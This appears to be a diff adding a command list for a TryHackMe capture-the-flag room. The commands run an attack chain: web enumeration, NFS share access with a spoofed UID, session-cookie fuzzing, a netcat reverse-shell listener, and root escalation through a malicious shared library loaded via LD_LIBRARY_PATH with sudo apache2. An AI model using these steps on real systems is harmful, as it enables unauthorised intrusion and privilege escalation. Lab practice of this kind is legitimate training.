@@ -1,0 +1,20 @@
+gobuster dir -u http://hijack.thm -w /usr/share/wordlists/dirb/big.txt -x php
+sudo /sbin/showmount -e 10.82.178.237
+mkdir share
+sudo mount -t nfs 10.82.178.237:/mnt/share share/
+sudo useradd fakeuser
+sudo usermod -u 1003 fakeuser
+sudo groupmod -g 1003 fakeuser
+sudo su fakeuser
+echo "dGVzdDo0YWMxYjYzZGNhNTYxZDI3NGM2MDU1ZWJmM2VkOTdkYg" |base64 -d
+hash-identifier
+echo -n 'test_pass' |md5sum
+python3 conv.py
+wfuzz -u http://10.82.178.237/administration.php -w list -X POST -b 'PHPSESSID= FUZZ' --hh 51
+nc -lvnp 4444
+su rick
+ldd /usr/sbin/apache2
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/rick/malicious_code.c
+sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
+https://cybersecfun.pythonanywhere.com/tryhackme/hijack.html
+
